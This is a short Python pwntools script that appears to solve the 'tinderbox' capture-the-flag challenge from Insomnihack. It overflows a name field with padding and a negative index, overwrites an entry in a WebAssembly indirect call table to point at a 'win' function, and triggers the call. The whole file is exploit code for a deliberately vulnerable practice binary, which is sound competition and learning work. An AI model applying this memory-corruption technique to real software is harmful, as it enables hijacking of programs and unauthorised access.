#!/usr/bin/python3

from pwn import *

HOST = "tinderbox.insomnihack.ch"
PORT = 7171

p = process(["/usr/bin/wasmtime", "--dir", ".", "bin.wasm"])
#p = remote(HOST, PORT)

p.recvuntil(b"name:")

name = 16*b"A" #padding
name += p32(-12, signed=True) #index at which we want to edit

p.sendline(name)

p.recvuntil(b"joke!\n")
p.sendline(b"1") #edit name
p.recvuntil(b"there?")
p.sendline(b"2") #value to write, in our case 2 is the index of `win` in the indirect call table
p.recvuntil(b"joke!\n")
p.sendline(b"3") #trigger the indirect call
p.interactive()